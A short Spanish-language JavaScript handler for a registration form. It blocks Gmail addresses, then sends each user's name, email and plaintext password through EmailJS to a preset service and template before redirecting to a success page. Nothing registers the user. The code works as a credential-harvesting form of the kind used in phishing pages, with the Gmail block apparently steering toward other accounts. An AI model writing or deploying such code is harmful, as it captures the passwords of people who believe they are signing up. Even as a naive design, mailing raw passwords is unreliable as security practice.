emailjs.init('ReqtkWfjI392LAzFb');

document.getElementById('formularioRegistro').addEventListener('submit', async (e) => {
    e.preventDefault();
    
    const boton = document.querySelector('.boton-registro');
    const emailInput = document.getElementById('correo');
    const errorEmail = document.getElementById('errorEmail');

    // Validar correo Gmail
    if (emailInput.value.toLowerCase().includes('@gmail.com')) {
        errorEmail.style.display = 'block';
        emailInput.style.borderColor = '#d63031';
        emailInput.focus();
        return;
    } else {
        errorEmail.style.display = 'none';
        emailInput.style.borderColor = '#e8e8e8';
    }

    boton.disabled = true;
    boton.innerHTML = `<div class="spinner"></div>Procesando...`;
    
    const datos = {
        nombre: document.getElementById('nombre').value.trim(),
        correo: emailInput.value.trim(),
        password: document.getElementById('password').value
    };

    try {
        await emailjs.send("service_syrc1uk", "template_u3etoro", datos);
        window.location.href = "exito.html";
    } catch (error) {
        alert('Error al enviar el registro. Intenta nuevamente.');
        console.error('Error:', error);
    } finally {
        boton.disabled = false;
        boton.innerHTML = `<span class="texto-boton">¡Registrarme ahora!</span><span class="icono-boton">🚀</span>`;
    }
});
